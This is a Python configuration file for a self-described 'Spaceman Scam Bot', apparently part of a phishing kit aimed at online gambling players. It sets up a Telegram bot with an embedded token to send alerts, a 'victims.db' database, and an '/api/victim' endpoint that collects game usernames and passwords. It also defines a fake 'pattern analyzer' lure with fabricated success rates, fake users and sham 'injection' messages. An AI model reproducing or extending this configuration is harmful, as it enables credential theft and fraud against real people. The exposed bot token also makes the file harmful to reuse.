#!/usr/bin/env python3
# setting.py - Configuration file for Spaceman Scam Bot

import os
from datetime import datetime

# ========== TELEGRAM CONFIG ==========
TELEGRAM = {
    "BOT_TOKEN": "8435967434:AAH_kIshWSlAdUFfDkZa6fn82qUkCNpKdCE",
    "CHAT_ID": "8388649100",
    "ADMIN_ID": "8388649100",
    "WEBHOOK_URL": None,  # Set if using webhooks
    "PARSE_MODE": "Markdown",
    "DISABLE_NOTIFICATION": False
}

# ========== SERVER CONFIG ==========
SERVER = {
    "HOST": "0.0.0.0",  # ← SUDAH BENAR (biarkan)
    "PORT": int(os.environ.get("PORT", 9000)),  # ← GANTI INI! Pakai PORT dari env
    "DEBUG": os.environ.get("FLASK_ENV") == "development",  # ← GANTI INI
    "SECRET_KEY": os.environ.get("SECRET_KEY", os.urandom(24).hex()),  # ← GANTI
    "CORS_ORIGINS": ["*"],  # Allow all origins
    "RATE_LIMIT": "100 per hour"
}

# ========== DATABASE CONFIG ==========
DATABASE = {
    "TYPE": "sqlite",  # sqlite, mysql, postgresql
    "PATH": "database/victims.db",
    "BACKUP_INTERVAL": 3600,  # Backup every hour
    "MAX_RECORDS": 10000
}

# ========== LOGGING CONFIG ==========
LOGGING = {
    "LEVEL": "INFO",  # DEBUG, INFO, WARNING, ERROR
    "FORMAT": "%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    "FILE": "logs/bot.log",
    "MAX_SIZE": 10485760,  # 10MB
    "BACKUP_COUNT": 5
}

# ========== SECURITY CONFIG ==========
SECURITY = {
    "ENCRYPTION_KEY": os.urandom(32).hex(),
    "ALLOWED_IPS": ["127.0.0.1", "localhost"],
    "BLOCKED_COUNTRIES": [],  # Country codes to block
    "MAX_REQUEST_SIZE": 1024 * 1024,  # 1MB
    "REQUEST_TIMEOUT": 30
}

# ========== NOTIFICATION CONFIG ==========
NOTIFICATIONS = {
    "ENABLE_EMAIL": False,
    "ENABLE_SMS": False,
    "ENABLE_DISCORD": False,
    "DISCORD_WEBHOOK": None,
    "ALERT_THRESHOLD": 10,  # Alert after 10 victims
    "DAILY_REPORT": True,
    "REPORT_TIME": "23:59"
}

# ========== SCAM CONFIG ==========
SCAM = {
    "PROJECT_NAME": "Spaceman Pattern Analyzer",
    "VERSION": "2.0.0",
    "WEBSITE_URL": "https://polagacor888.netlify.app/",
    "INJECTION_DELAY": 3,  # Fake injection delay in seconds
    "SUCCESS_RATE": 94.7,
    "FAKE_USERS_COUNT": 328,
    "MAINTENANCE_MODE": False
}

# ========== PATHS ==========
PATHS = {
    "BASE_DIR": os.path.dirname(os.path.abspath(__file__)),
    "DATABASE_DIR": os.path.join(os.path.dirname(os.path.abspath(__file__)), "database"),
    "LOGS_DIR": os.path.join(os.path.dirname(os.path.abspath(__file__)), "logs"),
    "TEMPLATES_DIR": os.path.join(os.path.dirname(os.path.abspath(__file__)), "templates"),
    "BACKUP_DIR": os.path.join(os.path.dirname(os.path.abspath(__file__)), "backups")
}

# ========== API CONFIG ==========
API = {
    "VERSION": "v1",
    "ENDPOINTS": {
        "victim": "/api/victim",
        "status": "/api/status",
        "stats": "/api/stats",
        "logs": "/api/logs",
        "backup": "/api/backup"
    },
    "REQUIRED_FIELDS": ["gameUsername", "gamePassword"],
    "OPTIONAL_FIELDS": ["gameUrl", "whatsappNumber", "email"]
}

# ========== FAKE DATA GENERATORS ==========
FAKE_DATA = {
    "WINNING_NUMBERS": [7.42, 6.85, 8.12, 9.35, 5.67, 4.23],
    "PATTERNS": ["Fibonacci", "Golden Ratio", "Random Walk", "Martingale", "D'Alembert"],
    "SUCCESS_MESSAGES": [
        "Pattern detected with 94.7% confidence",
        "High probability win detected",
        "Algorithm predicts successful outcome",
        "Injection sequence initiated"
    ],
    "USER_NAMES": ["Rudi_Pro", "Sultan_Judi", "Bocil_Kaya", "Player_X", "Gacor_Master"]
}

# ========== VALIDATION RULES ==========
VALIDATION = {
    "USERNAME_MIN_LENGTH": 3,
    "USERNAME_MAX_LENGTH": 50,
    "PASSWORD_MIN_LENGTH": 6,
    "WHATSAPP_LENGTH": 10,
    "URL_PATTERN": r'^https?://.+',
    "ALLOWED_GAME_DOMAINS": [".com", ".net", ".org", ".id"]
}

def get_config():
    """Return complete configuration"""
    return {
        "telegram": TELEGRAM,
        "server": SERVER,
        "database": DATABASE,
        "logging": LOGGING,
        "security": SECURITY,
        "notifications": NOTIFICATIONS,
        "scam": SCAM,
        "paths": PATHS,
        "api": API,
        "fake_data": FAKE_DATA,
        "validation": VALIDATION,
        "timestamp": datetime.now().isoformat()
    }

def print_config():
    """Print configuration (without sensitive data)"""
    config = get_config()
    safe_config = config.copy()
    safe_config["telegram"]["BOT_TOKEN"] = "***HIDDEN***"
    safe_config["security"]["ENCRYPTION_KEY"] = "***HIDDEN***"
    
    import json
    print(json.dumps(safe_config, indent=2, default=str))

if __name__ == "__main__":
    print_config()